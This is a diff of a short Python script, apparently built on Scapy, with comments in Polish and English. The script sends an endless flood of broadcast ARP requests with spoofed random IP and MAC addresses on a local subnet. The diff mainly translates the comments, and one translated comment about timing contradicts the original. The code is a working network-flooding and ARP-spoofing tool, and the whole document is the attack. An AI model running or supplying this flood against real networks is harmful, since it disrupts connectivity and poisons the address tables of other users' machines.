@@ -4,24 +4,25 @@ import time
 
 iface = "MediaTek Wi-Fi 6E MT7902 Wireless LAN Card"  # lub "eth0" w zależności od interfejsu
 
+# infinite loop to send ARP packets
 def flood_arp():
     try:
         while True:
-            # losowy adres IP w podsieci
+            # random IP address in network, skip .1 (router) and .255 (adres rozgłoszeniowy)
             fake_ip = f"192.168.1.{random.randint(2, 254)}"
-            # losowy MAC
+            # random MAC
             fake_mac = RandMAC()
 
             pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) / ARP(
                 op=1,               # "who has" (request)
-                psrc=fake_ip,
-                pdst=fake_ip,
+                psrc=fake_ip,       # pretending that we have this fake IP
+                pdst=fake_ip,       # asking who has the same address as psrc
                 hwsrc=fake_mac
             )
 
             sendp(pkt, iface=iface, verbose=False)
             print(f"Sent fake ARP: {fake_ip} is-at {fake_mac}")
-            time.sleep(0.01)  # Możesz to zmniejszyć, żeby było szybciej
+            time.sleep(0.01)  # make it a little slower
 
     except KeyboardInterrupt:
         print("\n[!] Przerwano floodowanie.")
